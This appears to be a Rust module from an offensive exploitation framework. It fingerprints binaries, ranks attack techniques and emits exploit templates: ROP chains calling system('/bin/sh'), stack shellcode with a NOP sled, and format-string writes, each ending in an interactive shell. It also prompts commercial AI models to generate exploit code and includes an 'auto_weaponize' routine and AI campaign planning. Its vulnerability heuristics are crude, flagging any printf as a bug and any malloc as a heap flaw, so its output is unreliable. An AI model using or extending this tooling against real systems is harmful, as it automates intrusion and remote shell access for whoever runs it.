use crate::ai_exploit_gen::{AIConfig, AIExploitGenerator, AIProvider, ExploitRequest};
use crate::ai_planner::AIPlanner;
use crate::binary_analyzer::BinaryAnalyzer;
use crate::campaign::Strategy;
use crate::environment_graph::EnvironmentGraph;
use crate::exploit_db::{ExploitDatabase, ExploitEntry};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::sync::Arc;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BinaryFingerprint {
    pub arch: String,
    pub os: String,
    pub protections: Vec<String>,
    pub vulnerabilities: Vec<VulnerabilityInfo>,
    pub interesting_functions: Vec<String>,
    pub writable_sections: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct VulnerabilityInfo {
    pub vuln_type: String,
    pub severity: String,
    pub location: String,
    pub description: String,
    pub exploitability: f64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ExploitSuggestion {
    pub rank: usize,
    pub exploit_type: String,
    pub technique: String,
    pub description: String,
    pub success_probability: f64,
    pub complexity: String,
    pub prerequisites: Vec<String>,
    pub talon_template: String,
    pub references: Vec<String>,
}

pub struct SuggestionEngine {
    ai_config: Option<AIConfig>,
    exploit_db: ExploitDatabase,
}

impl SuggestionEngine {
    pub fn new() -> Self {
        SuggestionEngine {
            ai_config: None,
            exploit_db: ExploitDatabase::new(),
        }
    }

    pub fn with_ai(api_key: String, provider: AIProvider) -> Self {
        let ai_config = match provider {
            AIProvider::OpenAI => Some(AIConfig {
                provider: AIProvider::OpenAI,
                api_key: Some(api_key),
                model_name: "gpt-4".to_string(),
                ..Default::default()
            }),
            AIProvider::Anthropic => Some(AIConfig {
                provider: AIProvider::Anthropic,
                api_key: Some(api_key),
                model_name: "claude-3-5-sonnet-20241022".to_string(),
                ..Default::default()
            }),
            _ => Some(AIConfig::default()),
        };

        SuggestionEngine {
            ai_config,
            exploit_db: ExploitDatabase::new(),
        }
    }

    pub fn analyze_binary(&self, binary_path: &str) -> Result<BinaryFingerprint, String> {
        let analysis = BinaryAnalyzer::analyze(binary_path)?;

        let arch = analysis.architecture.clone();
        let os = analysis.os.clone();

        let mut protections = Vec::new();
        if analysis.protections.nx {
            protections.push("NX".to_string());
        }
        if analysis.protections.pie {
            protections.push("PIE".to_string());
        }
        if analysis.protections.canary {
            protections.push("Canary".to_string());
        }
        match analysis.protections.relro {
            crate::binary_analyzer::RelroLevel::Full => protections.push("Full RELRO".to_string()),
            crate::binary_analyzer::RelroLevel::Partial => {
                protections.push("Partial RELRO".to_string())
            }
            crate::binary_analyzer::RelroLevel::None => {}
        }

        let vulnerabilities = self.scan_vulnerabilities_from_analysis(&analysis)?;
        let interesting_functions = BinaryAnalyzer::find_interesting_functions(&analysis.symbols);
        let writable_sections = BinaryAnalyzer::find_writable_sections(&analysis.sections);

        Ok(BinaryFingerprint {
            arch,
            os,
            protections,
            vulnerabilities,
            interesting_functions,
            writable_sections,
        })
    }

    pub fn suggest_exploits(&self, fingerprint: &BinaryFingerprint) -> Vec<ExploitSuggestion> {
        let mut suggestions = Vec::new();
        let mut rank = 1;

        for vuln in &fingerprint.vulnerabilities {
            let suggestion = self.create_suggestion_for_vuln(vuln, fingerprint, rank);
            suggestions.push(suggestion);
            rank += 1;
        }

        if suggestions.is_empty() {
            suggestions.push(self.create_generic_suggestion(fingerprint, rank));
        }

        suggestions.sort_by(|a, b| {
            b.success_probability
                .partial_cmp(&a.success_probability)
                .unwrap_or(std::cmp::Ordering::Equal)
        });

        for (idx, suggestion) in suggestions.iter_mut().enumerate() {
            suggestion.rank = idx + 1;
        }

        suggestions
    }

    pub fn generate_exploit_code(
        &self,
        suggestion: &ExploitSuggestion,
        target: &str,
    ) -> Result<String, String> {
        if let Some(ai_config) = &self.ai_config {
            let ai_gen = AIExploitGenerator::new(ai_config.clone());
            let request = ExploitRequest {
                target_binary: target.to_string(),
                vulnerability_type: suggestion.exploit_type.clone(),
                architecture: "x86_64".to_string(),
                context: Some(suggestion.description.clone()),
                constraints: suggestion.prerequisites.clone(),
            };

            if let Ok(response) = ai_gen.generate_exploit(&request) { return Ok(response.exploit_code) }
        }

        Ok(suggestion.talon_template.clone())
    }

    pub async fn auto_weaponize(
        &self,
        fingerprint: &BinaryFingerprint,
        target: &str,
        port: Option<u16>,
    ) -> Result<String, String> {
        let best_exploit = self
            .find_best_exploit_match(fingerprint)
            .await
            .ok_or("No matching exploit found")?;

        let mut parameters = HashMap::new();
        parameters.insert("target".to_string(), target.to_string());
        if let Some(p) = port {
            parameters.insert("port".to_string(), p.to_string());
        }
        parameters.insert("arch".to_string(), fingerprint.arch.clone());

        let weaponized = self
            .exploit_db
            .weaponize(&best_exploit.id, target, port, parameters)
            .await?;

        Ok(String::from_utf8_lossy(&weaponized.payload).to_string())
    }

    pub async fn suggest_campaign_strategy(
        &self,
        objective: &str,
        environment: Arc<EnvironmentGraph>,
    ) -> Result<Vec<Strategy>, String> {
        let planner = AIPlanner::new(environment.clone());

        let objective_parsed = crate::campaign::CampaignObjective {
            goal_type: crate::campaign::ObjectiveType::Custom(objective.to_string()),
            target: objective.to_string(),
            success_criteria: vec![],
        };

        let start_node = 1;
        let planning_result = planner.plan_campaign(&objective_parsed, start_node).await?;

        Ok(planning_result.strategies)
    }

    fn scan_vulnerabilities_from_analysis(
        &self,
        analysis: &crate::binary_analyzer::BinaryAnalysis,
    ) -> Result<Vec<VulnerabilityInfo>, String> {
        let mut vulnerabilities = Vec::new();

        let dangerous_funcs = BinaryAnalyzer::find_dangerous_functions(&analysis.symbols);

        for func in dangerous_funcs {
            if func.contains("strcpy") || func.contains("gets") || func.contains("sprintf") {
                vulnerabilities.push(VulnerabilityInfo {
                    vuln_type: "buffer_overflow".to_string(),
                    severity: "high".to_string(),
                    location: format!("{} function", func),
                    description: format!(
                        "Dangerous function {} detected - potential buffer overflow",
                        func
                    ),
                    exploitability: if !analysis.protections.nx && !analysis.protections.canary {
                        0.95
                    } else if !analysis.protections.nx {
                        0.75
                    } else if !analysis.protections.canary {
                        0.65
                    } else {
                        0.45
                    },
                });
            }

            if func.contains("printf") || func.contains("scanf") || func.contains("fprintf") {
                vulnerabilities.push(VulnerabilityInfo {
                    vuln_type: "format_string".to_string(),
                    severity: "high".to_string(),
                    location: format!("{} function", func),
                    description: format!(
                        "Format string function {} - potential arbitrary write",
                        func
                    ),
                    exploitability: if !analysis
                        .protections
                        .relro
                        .eq(&crate::binary_analyzer::RelroLevel::Full)
                    {
                        0.80
                    } else {
                        0.50
                    },
                });
            }
        }

        if analysis
            .symbols
            .iter()
            .any(|s| s.name.contains("malloc") || s.name.contains("free"))
        {
            vulnerabilities.push(VulnerabilityInfo {
                vuln_type: "heap_overflow".to_string(),
                severity: "medium".to_string(),
                location: "heap management functions".to_string(),
                description: "Heap allocation functions present - potential heap exploitation"
                    .to_string(),
                exploitability: 0.40,
            });
        }

        if vulnerabilities.is_empty() {
            vulnerabilities.push(VulnerabilityInfo {
                vuln_type: "unknown".to_string(),
                severity: "low".to_string(),
                location: "general".to_string(),
                description: "No obvious vulnerabilities detected - manual analysis recommended"
                    .to_string(),
                exploitability: 0.20,
            });
        }

        Ok(vulnerabilities)
    }

    fn create_suggestion_for_vuln(
        &self,
        vuln: &VulnerabilityInfo,
        fingerprint: &BinaryFingerprint,
        rank: usize,
    ) -> ExploitSuggestion {
        let has_nx = fingerprint.protections.contains(&"NX".to_string());

        match vuln.vuln_type.as_str() {
            "buffer_overflow" => {
                if has_nx {
                    ExploitSuggestion {
                        rank,
                        exploit_type: "ROP Chain".to_string(),
                        technique: "Return-Oriented Programming".to_string(),
                        description: "NX is enabled - use ROP to execute system()".to_string(),
                        success_probability: vuln.exploitability * 0.8,
                        complexity: "Medium".to_string(),
                        prerequisites: vec!["Find ROP gadgets".to_string(), "Leak libc base if PIE".to_string()],
                        talon_template: self.generate_rop_template(fingerprint),
                        references: vec![
                            "https://ropemporium.com/".to_string(),
                            "https://github.com/JonathanSalwan/ROPgadget".to_string(),
                        ],
                    }
                } else {
                    ExploitSuggestion {
                        rank,
                        exploit_type: "Direct Shellcode".to_string(),
                        technique: "Stack-based shellcode execution".to_string(),
                        description: "NX is disabled - inject and execute shellcode".to_string(),
                        success_probability: vuln.exploitability * 0.95,
                        complexity: "Low".to_string(),
                        prerequisites: vec!["Find stack offset".to_string()],
                        talon_template: self.generate_shellcode_template(fingerprint),
                        references: vec!["http://shell-storm.org/shellcode/".to_string()],
                    }
                }
            }
            "format_string" => ExploitSuggestion {
                rank,
                exploit_type: "Format String".to_string(),
                technique: "Arbitrary write via format string".to_string(),
                description: "Overwrite GOT entries or return addresses".to_string(),
                success_probability: vuln.exploitability * 0.7,
                complexity: "Medium".to_string(),
                prerequisites: vec!["Find format string offset".to_string()],
                talon_template: self.generate_format_string_template(fingerprint),
                references: vec!["https://crypto.stanford.edu/cs155/papers/formatstring-1.2.pdf".to_string()],
            },
            _ => ExploitSuggestion {
                rank,
                exploit_type: "Custom Exploit".to_string(),
                technique: "Manual exploitation".to_string(),
                description: format!("Custom exploit for {}", vuln.vuln_type),
                success_probability: vuln.exploitability * 0.5,
                complexity: "High".to_string(),
                prerequisites: vec!["Manual analysis required".to_string()],
                talon_template: "# Custom exploit - analyze binary first\nlet session = Session.connect(target, port)\n".to_string(),
                references: vec![],
            },
        }
    }

    fn create_generic_suggestion(
        &self,
        fingerprint: &BinaryFingerprint,
        rank: usize,
    ) -> ExploitSuggestion {
        ExploitSuggestion {
            rank,
            exploit_type: "Reconnaissance".to_string(),
            technique: "Information gathering".to_string(),
            description: "No obvious vulnerabilities found - start with fuzzing".to_string(),
            success_probability: 0.3,
            complexity: "Variable".to_string(),
            prerequisites: vec!["Fuzzing tools".to_string(), "Debugger".to_string()],
            talon_template: format!(
                "# Reconnaissance for {} binary\nlet session = Session.connect(target, port)\nlet crash_input = fuzz_binary(\"{}\")\n",
                fingerprint.arch, fingerprint.arch
            ),
            references: vec!["https://aflplus.plus/".to_string()],
        }
    }

    fn generate_rop_template(&self, fingerprint: &BinaryFingerprint) -> String {
        format!(
            r#"# ROP Chain Exploit for {}
let session = Session.connect(target, port)

let offset = cyclic_find_offset(session)
let padding = cyclic(offset)

let libc_base = leak_libc(session)
let system = libc_base + 0x4f440
let binsh = libc_base + 0x1b3e9a
let pop_rdi = libc_base + 0x2164f

let rop_chain = [
    pop_rdi,
    binsh,
    system
]

let payload = padding + pack_addresses(rop_chain)
session.send(payload)
session.interactive()
"#,
            fingerprint.arch
        )
    }

    fn generate_shellcode_template(&self, fingerprint: &BinaryFingerprint) -> String {
        format!(
            r#"# Shellcode Injection for {}
let session = Session.connect(target, port)

let offset = cyclic_find_offset(session)
let padding = cyclic(offset)

let shellcode = shellcode_execve("{}")
let nop_sled = "\x90" * 100
let return_addr = 0xbffff000

let payload = padding + pack64(return_addr) + nop_sled + shellcode
session.send(payload)
session.interactive()
"#,
            fingerprint.arch, fingerprint.arch
        )
    }

    fn generate_format_string_template(&self, _fingerprint: &BinaryFingerprint) -> String {
        r#"# Format String Exploit
let session = Session.connect(target, port)

let offset = 6
let target_addr = 0x0804a000
let value = 0xdeadbeef

let payload = fmtstr_payload(offset, {target_addr: value})
session.send(payload)
session.interactive()
"#
        .to_string()
    }

    async fn find_best_exploit_match(
        &self,
        fingerprint: &BinaryFingerprint,
    ) -> Option<ExploitEntry> {
        for vuln in &fingerprint.vulnerabilities {
            let results = self
                .exploit_db
                .query(
                    &vuln.vuln_type,
                    &fingerprint.os,
                    fingerprint.protections.clone(),
                )
                .await;

            if !results.is_empty() {
                return Some(results[0].clone());
            }
        }

        None
    }
}

impl Default for SuggestionEngine {
    fn default() -> Self {
        Self::new()
    }
}

pub fn suggest_exploits_for_binary(binary_path: &str) -> Result<Vec<ExploitSuggestion>, String> {
    let engine = SuggestionEngine::new();
    let fingerprint = engine.analyze_binary(binary_path)?;
    Ok(engine.suggest_exploits(&fingerprint))
}

pub fn suggest_exploits_with_ai(
    binary_path: &str,
    api_key: String,
    provider: AIProvider,
) -> Result<Vec<ExploitSuggestion>, String> {
    let engine = SuggestionEngine::with_ai(api_key, provider);
    let fingerprint = engine.analyze_binary(binary_path)?;
    Ok(engine.suggest_exploits(&fingerprint))
}
